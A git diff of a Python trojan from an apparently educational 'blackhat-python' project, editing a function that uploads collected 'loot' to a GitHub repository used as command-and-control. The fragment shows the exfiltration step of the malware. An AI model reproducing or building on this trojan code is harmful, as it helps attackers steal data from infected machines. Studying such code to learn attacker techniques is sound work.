@@ -16,7 +16,7 @@ MODULE_URL="/home/dks/Development/Python/blackhat-python"
 CONFIG_DIR="trojan_command/config/trojan_conf.json"
 CONFIG=[]
 
-LOOT_DIR="trojan_command/loot/%s" % ID
+LOOT_DIR="trojan_command/loot"
 LOOT_NUM = 1
 
 MODULE_DIR="trojan_command/modules"
@@ -179,12 +179,15 @@ def GetConfig():
             
 def StoreLoot(loot):
     global LOOT_NUM
-    
+
     gh, repo = ConnectToGithub()
     remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, "testing")
+    print("Storing the loot to %s" % remote_path)
+    
     #remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, datetime.time.strftime("%H%M"))
     #repo.create_file(remote_path, datetime.date.strftime("%Y-%m-%d"), base64.b64encode(loot))
-    repo.create_file( remote_path, "testing...", base64.b64encode(loot) )
+    #repo.create_file( remote_path, "testing...", base64.b64encode(loot.encode("utf-8")) )
+    repo.create_file( remote_path, "testing...", loot.encode("utf-8") )
     LOOT_NUM += 1
 
     return
